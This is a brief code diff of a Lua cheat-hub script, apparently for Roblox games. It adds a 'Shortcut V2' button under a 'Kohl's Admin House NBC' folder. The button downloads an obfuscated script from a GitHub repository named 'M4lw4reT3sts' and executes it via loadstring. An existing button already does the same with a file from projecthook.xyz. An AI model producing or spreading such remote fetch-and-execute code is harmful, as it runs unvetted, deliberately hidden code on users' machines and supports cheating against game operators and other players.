@@ -2257,8 +2257,11 @@ do -- Example UI
 			loadstring(game:HttpGet("https://projecthook.xyz/scripts/free.lua"))()
 		end)
 		
-	local Folder = Tab:AddFolder("Placeholder")
-		
+	local Folder = Tab:AddFolder("Kohl's Admin House NBC")
+	
+		Tab:AddButton("Shortcut V2", function()
+			loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/Obfuscated%20SCV2-NP%20release.txt'),true))()
+		end)
 		
 	local Folder = Tab:AddFolder("Giant Survival")
 	
